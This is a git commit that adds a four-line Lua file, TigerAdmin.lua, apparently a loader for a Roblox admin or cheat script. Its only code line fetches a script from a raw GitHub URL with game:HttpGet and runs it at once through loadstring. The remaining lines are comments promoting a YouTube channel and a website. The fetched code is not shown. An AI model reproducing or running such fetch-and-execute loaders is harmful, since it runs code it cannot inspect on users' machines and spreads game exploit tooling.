bd316d409bd4b09dacce574aca017aebcdeb9c6e
NotFalxe <96351276+NotFalxe@users.noreply.github.com>
2022-05-25 17:16:24 -0500

    Create TigerAdmin.lua

---
+++ TigerAdmin.lua
@@ -0,0 +1,4 @@
+loadstring(game:HttpGet(('https://raw.githubusercontent.com/h17s3/TIGERADMIN/main/TIGERADMINSCRIPTFREE'),true))()
+-- thank me for not making you go through any ads :) consider subscribing :)
+-- youtube.com/VapourYT
+-- vapouryt.co.uk
